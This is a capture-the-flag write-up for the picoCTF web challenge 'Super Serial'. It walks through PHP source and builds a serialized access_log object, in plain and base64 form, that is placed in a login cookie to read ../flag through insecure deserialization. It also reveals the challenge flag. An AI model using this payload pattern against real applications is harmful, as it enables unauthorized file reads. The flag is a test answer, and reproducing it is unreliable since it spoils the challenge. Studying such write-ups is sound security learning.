# PHP Deserialization Injection
* Name: Super Serial
* Category: Web 
* Technique: `PHP Deserialization Injection`
* Hint: `The flag is at ../flag`
## Solution 
* Overview the challenge have a login form 
![image](https://user-images.githubusercontent.com/79050415/152352808-604d5a55-b4bd-453d-bc81-b58ade06ee9d.png)
* Initial reconnaissance
* The first i look at login form i think its `sql injection` but i used some payloads its response error, but name of the challenges `Super Serial` i gessing its `Deserialization`
* All challenges i solved always have attachment source code but this challenge must fuzzing found source code, i used `dirsearch` for fuzzing 
![image](https://user-images.githubusercontent.com/79050415/152356327-9c58ddd6-e844-4864-bf66-68569fd4f974.png)
* I found other pages 
```c
index.php
cookie.php
authentication.php
index.php
cookie.php
authentication.php
```
* I cant access this page i must add `s` because i access `robots.txt` its hint for me
![image](https://user-images.githubusercontent.com/79050415/152357593-2e3414d5-bff9-47a7-847a-8728722ee51e.png)
* After i access other pages i found a source code 
## Source Code Analysis
* `index.phps`
```c
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
* `user` and `pass` used `POST` method 
* username and password assign variable `$perm_res` for authenticate
* if `$perm_res->is_guest()` and `$perm_res->is_admin()` are true `cookie` will create header `Location` set value equal `authentication.php` then its direct from login page to `welcome` page 
* `setcookie` `login` its created by serialize `$perm_res` variable then ` base64` and `urlencode` 
* `cookie.phps`
```c
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
 ```
 * The function `is_admin()` and ` is_guest()` are same check attribute username and password of `permission` class by query to database `users.db` because 2 function used `prepared statements` and `parameterized queries` so exploit sql injection is impossiable 
 * `IF` block code check cookie of `login` if serialize true its response flag and false its response message `Deserialization error`
 * `authentication.phps`
 ```c
 <?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
* Class `access_log` have 2 magic methods `__construct` and `__toString`. Method `__toString` response `read_log()`, `read_log()` will response content of file and transmisson ` constructor` of `access_log` class via ` file_get_contents` + Magic method wil execute when class create, therefore i created an object `access_log` 
```c
<?php

class access_log {
	public $log_file;
}

$object = new access_log;

$object->log_file = "../flag";

$serializedObject = serialize($object);

echo $serializedObject;

?>
```
* The script when i run 
![image](https://user-images.githubusercontent.com/79050415/152373825-40d495e7-8d98-40c5-a1a0-1a4ce1041f1d.png)
```c
`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
```
* After that i encode payload above to base64 
```c
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
![image](https://user-images.githubusercontent.com/79050415/152377105-484a584a-6414-42f5-acf9-fa829d09ff4d.png)
* I change `name` and `value` of `cookies` 
![image](https://user-images.githubusercontent.com/79050415/152379335-6ab4f2d9-59d2-433a-8c70-c5fa95a4fc37.png)
* Finally i found a flag =)))
![image](https://user-images.githubusercontent.com/79050415/152379613-bd3c0580-6527-4f4c-96d0-b8da7a9a7d34.png)
 * FLAG `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}`




